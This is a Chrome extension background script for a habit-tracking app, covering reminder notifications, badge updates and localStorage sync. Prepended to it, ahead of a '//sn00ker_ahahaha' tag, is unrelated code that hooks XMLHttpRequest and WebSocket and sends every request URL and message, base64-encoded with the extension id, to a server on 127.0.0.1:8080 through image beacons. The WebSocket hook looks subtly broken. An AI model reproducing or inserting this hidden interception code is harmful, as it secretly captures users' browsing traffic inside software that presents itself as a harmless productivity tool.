function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var timeoutLength = 60*60*1000;
var notifier;
importData(localStorage.save);

if (typeof localStorage.firstTime != "string"){
    localStorage.firstTime = true;
    chrome.tabs.create({url: "html/tut.html"});
}

updateBadge();
checkIfDatePassed();

function checkInterv(){

    backgroundSync();
    
    if (!isNaN(parseInt(localStorage.notifInterval))) {
        timeoutLength = parseInt(localStorage.notifInterval);
    }
    if (localStorage.notifActive == "false"){
        notifier = setTimeout(function(){checkInterv()}, 10*60*1000);
    }
    else{
        notify();
        notifier = setTimeout(function(){checkInterv()}, timeoutLength);
    }
}

checkInterv();

function notify(messageFx){
	var title = "Doing alright?"
    console.log("fired")
    message = notifierAgent();
    chrome.notifications.clear("id", function() {});
    var opt = {
        type: "basic",
        title: title,
        message: message,
        iconUrl: "../icon.png"
    }
    if (localStorage.notifActive != "false"){
        chrome.notifications.create("id", opt, function() {})
    }
}

function notifierAgent(){
    var temp = [];
    for (var i = 0 ; i < taskArray.length; i++){
        if (taskArray[i].daysDone[dayOfWeek-1] == 2){
            temp.push(taskArray[i].name);
        }
    }
    if (temp.length>0){
        return "Try this habit: " + temp[Math.floor(Math.random()*temp.length)];
    }
    return "Stay positive!";
}

function backgroundSync(){
    taskArray = [];
    archGroupArray = [];
    importData(localStorage.save);
    updateDate();
    checkIfDatePassed();
    saveToLS();
    updateBadge();
}